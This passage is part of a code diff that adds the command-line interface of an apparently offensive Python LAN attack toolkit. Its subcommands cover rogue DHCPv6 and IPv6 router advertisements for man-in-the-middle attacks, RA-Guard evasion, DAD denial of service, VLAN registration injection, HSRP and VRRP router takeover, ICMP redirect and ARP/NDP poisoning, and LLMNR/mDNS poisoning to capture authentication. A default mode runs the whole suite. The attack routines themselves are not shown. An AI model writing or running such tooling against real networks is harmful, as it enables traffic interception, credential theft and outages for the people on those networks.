+    p.add_argument("--domain", default=None, help="DNS search domain")
+    p.add_argument("--ra", action="store_true",
+                   help="also send steering RAs (M/O bits, routerlifetime=0)")
+    p.add_argument("-t", "--time", type=int, default=0,
+                   help="seconds, 0 = until Ctrl-C")
+    p.set_defaults(fn=roguedhcp6_cmd)
+
+    p = sub.add_parser("raguard", help="RA-Guard evasion probe (RFC 6980/"
+                                       "7113): RA behind DestOpt chain and/"
+                                       "or fragment split, doc-space prefix")
+    p.add_argument("--mode", choices=["plain", "chain", "frag", "all"],
+                   default="all")
+    p.add_argument("--prefix", default="2001:db8:deed::")
+    p.add_argument("--frag-len", type=int, default=96,
+                   help="fragment split offset (RA lands in frag 2)")
+    p.add_argument("-c", "--count", type=int, default=5,
+                   help="bursts per mode")
+    p.set_defaults(fn=raguard_cmd)
+
+    p = sub.add_parser("daddos", help="SLAAC DAD poison: answer every "
+                                      "tentative NS with an Override NA "
+                                      "(harm while running only)")
+    p.add_argument("-t", "--time", type=int, default=0,
+                   help="seconds, 0 = until Ctrl-C")
+    p.set_defaults(fn=daddos_cmd)
+
+    p = sub.add_parser("mvrp", help="MVRP/GVRP dynamic VLAN registration "
+                                    "injection (no public tool exists)")
+    p.add_argument("--vlans", required=True,
+                   help="'1,10-20' VLAN ids")
+    p.add_argument("--join", action="store_true", default=True,
+                   help="JoinIn (default) vs LeaveEmpty")
+    p.add_argument("--leave", dest="join", action="store_false")
+    p.add_argument("-c", "--count", type=int, default=10)
+    p.add_argument("--interval", type=float, default=1)
+    p.set_defaults(fn=mvrp_cmd)
+
+    p = sub.add_parser("hsrp", help="HSRP active-router takeover")
+    p.add_argument("--vip", required=True)
+    p.add_argument("--group", type=int, default=1)
+    p.set_defaults(fn=hsrp_cmd)
+
+    p = sub.add_parser("icmpredirect", help="L3: poison routes via ICMP "
+                                            "redirect")
+    p.add_argument("-t", "--targets", nargs="+", required=True)
+    p.add_argument("--dest", nargs="+", default=["172.16.0.1"])
+    p.add_argument("--gateway", default=None)
+    p.add_argument("--interval", type=float, default=5)
+    p.set_defaults(fn=icmpredirect_cmd)
+
+    p = sub.add_parser("gratarp", help="gratuitous ARP storm claiming an IP "
+                                       "(default gateway)")
+    p.add_argument("--ip", default="172.16.0.1")
+    p.add_argument("--interval", type=float, default=0.2)
+    p.set_defaults(fn=gratarp_cmd)
+
+    p = sub.add_parser("llmnr", help="LLMNR/NBT-NS/mDNS name-resolution "
+                                     "poisoning (auth capture prep)")
+    p.add_argument("-t", "--time", type=int, default=0,
+                   help="seconds, 0 = until Ctrl-C")
+    p.set_defaults(fn=llmnr_cmd)
+
+    p = sub.add_parser("roguera", help="rogue IPv6 Router Advertisement + "
+                                       "RDNSS take-over (SLAAC MITM)")
+    p.add_argument("--prefix", default="fd00:dead:beef::",
+                   help="ULA/global prefix to offer")
+    p.add_argument("--rdns", default=None,
+                   help="DNS server to inject (default: our link-local)")
+    p.add_argument("--lifetime", type=int, default=1800)
+    p.add_argument("--interval", type=float, default=3)
+    p.set_defaults(fn=roguera_cmd)
+
+    p = sub.add_parser("ndpspoof", help="IPv6 NDP cache poison (IPv6 ARP "
+                                        "spoof analogue)")
+    p.add_argument("-t", "--targets", nargs="+", default=None,
+                   help="victim IPv6 addrs for gw-side poison (needs --gw-mac)")
+    p.add_argument("--gw", default=None,
+                   help="gateway link-local (default: derived from gw MAC)")
+    p.add_argument("--gw-mac", default=None)
+    p.add_argument("--interval", type=float, default=1)
+    p.set_defaults(fn=ndpspoof_cmd)
+
+    p = sub.add_parser("vrrp", help="VRRP master takeover (priority "
+                                    "election hijack)")
+    p.add_argument("--vrid", type=int, required=True)
+    p.add_argument("--vip", nargs="+", required=True)
+    p.add_argument("--priority", type=int, default=255)
+    p.add_argument("--interval", type=float, default=1)
+    p.set_defaults(fn=vrrp_cmd)
+
+    args = ap.parse_args()
+    if args.cmd is None:  # no subcommand -> full suite with defaults
+        args.scan_time = 15
+        args.duration = 30
+        args.stp_tag = None
+        args.no_spoof = False
+        args.ra_prefix = "fd00:dead:beef::"
+        args.fn = full_cmd
+    args.fn(args)
+
+
+if __name__ == "__main__":
+    main()
